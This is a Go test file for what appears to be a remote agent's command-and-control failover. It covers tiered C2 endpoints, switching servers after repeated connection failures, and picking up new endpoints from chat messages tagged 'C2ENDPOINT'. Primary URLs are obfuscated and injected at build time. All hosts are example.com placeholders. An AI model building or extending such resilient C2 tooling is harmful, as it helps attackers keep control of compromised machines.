package main

import (
	"os"
	"strings"
	"testing"
)

func foReset(t *testing.T) {
	t.Helper()
	c2fo = &c2Failover{}
	config = loadConfig()
}

func TestTierBuildEnvFirst(t *testing.T) {
	os.Setenv("C2_SERVER", "wss://env-override.example.com/agent")
	defer os.Unsetenv("C2_SERVER")
	foReset(t)
	initC2Failover()

	if len(c2fo.tiers) == 0 {
		t.Fatalf("expected at least the env tier, got 0 tiers")
	}
	if c2fo.tiers[0] != "wss://env-override.example.com/agent" {
		t.Fatalf("tier0 = %q, want env override", c2fo.tiers[0])
	}
	// Hardened tree blanks eWssURL/eWssURL2/eWssURL3 (primary endpoint ships via
	// build-time ldflags injection, not baked plaintext). So with only the env
	// override set there may be a single tier. When a baked primary IS present,
	// tier1 must be it — never the lab loopback.
	baked := strings.TrimSpace(xob(eWssURL))
	if len(c2fo.tiers) >= 2 && baked != "" {
		if c2fo.tiers[1] != baked {
			t.Fatalf("tier1 = %q, want baked eWssURL %q", c2fo.tiers[1], baked)
		}
	}
	for i, tier := range c2fo.tiers {
		if tier == "" {
			t.Fatalf("empty tier at index %d: %v", i, c2fo.tiers)
		}
	}
	if config.C2Server != c2fo.tiers[0] {
		t.Fatalf("config.C2Server = %q, want tier0 applied", config.C2Server)
	}
}

func TestTierSkipEmptyAndDedupe(t *testing.T) {
	os.Unsetenv("C2_SERVER")
	foReset(t)
	initC2Failover()

	for _, tier := range c2fo.tiers {
		if tier == "" {
			t.Fatalf("empty tier present: %v", c2fo.tiers)
		}
	}
	seen := map[string]bool{}
	for _, tier := range c2fo.tiers {
		if seen[tier] {
			t.Fatalf("duplicate tier %q in %v", tier, c2fo.tiers)
		}
		seen[tier] = true
	}
}

func TestAdvanceOnFailures(t *testing.T) {
	os.Setenv("C2_SERVER", "wss://t0.example.com/agent")
	defer os.Unsetenv("C2_SERVER")
	os.Setenv("C2_FAILOVER_THRESHOLD", "3")
	defer os.Unsetenv("C2_FAILOVER_THRESHOLD")
	foReset(t)
	initC2Failover()
	n := len(c2fo.tiers)
	if n < 2 {
		t.Skipf("only %d tier(s) baked — bake eWssURL2 to exercise advance", n)
	}
	start := c2fo.tiers[c2fo.idx]

	// below threshold: no advance
	c2NoteConnectFailure()
	c2NoteConnectFailure()
	if config.C2Server != start {
		t.Fatalf("advanced after 2 failures (threshold 3)")
	}
	// third failure: advance
	c2NoteConnectFailure()
	if config.C2Server == start {
		t.Fatalf("no advance after threshold failures")
	}
	// success resets
	c2NoteConnectSuccess()
	if c2fo.fails != 0 || c2fo.fullCycles != 0 {
		t.Fatalf("success did not reset counters")
	}
}

func TestWrapFullCycleIncrements(t *testing.T) {
	os.Setenv("C2_SERVER", "wss://t0.example.com/agent")
	defer os.Unsetenv("C2_SERVER")
	os.Setenv("C2_FAILOVER_THRESHOLD", "1")
	defer os.Unsetenv("C2_FAILOVER_THRESHOLD")
	foReset(t)
	initC2Failover()
	n := len(c2fo.tiers)
	if n < 2 {
		t.Skipf("only %d tier(s) baked", n)
	}
	for i := 0; i < n; i++ {
		c2NoteConnectFailure()
	}
	if c2fo.fullCycles != 1 {
		t.Fatalf("fullCycles = %d, want 1 after one round", c2fo.fullCycles)
	}
	if c2fo.idx != 0 {
		t.Fatalf("idx = %d after wrap, want 0", c2fo.idx)
	}
}

func TestC2AddEndpointPrependsAndDedupes(t *testing.T) {
	foReset(t)
	initC2Failover()
	before := len(c2fo.tiers)

	if c2AddEndpoint("garbage") {
		t.Fatalf("accepted invalid endpoint")
	}
	if !c2AddEndpoint("wss://rediscovered.example.com/agent") {
		t.Fatalf("rejected valid endpoint")
	}
	if c2fo.tiers[0] != "wss://rediscovered.example.com/agent" {
		t.Fatalf("new endpoint not prepended: %v", c2fo.tiers[:2])
	}
	if len(c2fo.tiers) != before+1 {
		t.Fatalf("tier count = %d, want %d", len(c2fo.tiers), before+1)
	}
	// dedupe: adding an existing endpoint must not grow the list
	dupe := c2fo.tiers[len(c2fo.tiers)-1]
	if !c2AddEndpoint(dupe) && dupe != "" {
		t.Fatalf("rejected existing endpoint for dedupe move")
	}
	if len(c2fo.tiers) != before+1 {
		t.Fatalf("dedupe failed: %d tiers, want %d", len(c2fo.tiers), before+1)
	}
}

func TestParseTGEndpoint(t *testing.T) {
	texts := []string{
		"hello bot",
		"C2ENDPOINT wss://old.example.com/agent",
		"some chatter",
		"c2endpoint: wss://new.example.com:8443/agent",
	}
	got := c2ParseTGEndpoint(texts)
	if got != "wss://new.example.com:8443/agent" {
		t.Fatalf("parse = %q, want newest C2ENDPOINT", got)
	}
	if c2ParseTGEndpoint([]string{"nothing here"}) != "" {
		t.Fatalf("matched on non-matching text")
	}
	// malicious / malformed endpoints must not parse
	if c2ParseTGEndpoint([]string{"C2ENDPOINT file://evil"}) != "" {
		t.Fatalf("accepted non-http scheme")
	}
}

func TestBakedFallbacksCompileAndDontBreakEnvChain(t *testing.T) {
	foReset(t)
	// template tree: baked values empty, env chain still feeds AuthToken
	os.Setenv("C2_AUTH_TOKEN", "envtoken123")
	defer os.Unsetenv("C2_AUTH_TOKEN")
	cfg := loadConfig()
	if cfg.AuthToken != "envtoken123" {
		t.Fatalf("env token chain broken: %q", cfg.AuthToken)
	}
	if bakedAgentToken() != "" && bakedAgentToken() != "envtoken123" {
		// in the template tree bakedAgentToken() must be empty; tolerate the
		// env-mirror only if a baked build is being tested.
		t.Logf("baked token present (%d bytes) — ok for baked build tree", len(bakedAgentToken()))
	}
}

func TestApplyTierSyncsWSPath(t *testing.T) {
	foReset(t)
	initC2Failover()
	// advancing to a tier with a path must sync config.WSPath
	c2AddEndpoint("wss://tierpath.example.com/custom/path")
	if config.WSPath != "/custom/path" {
		t.Fatalf("WSPath = %q, want /custom/path", config.WSPath)
	}
}
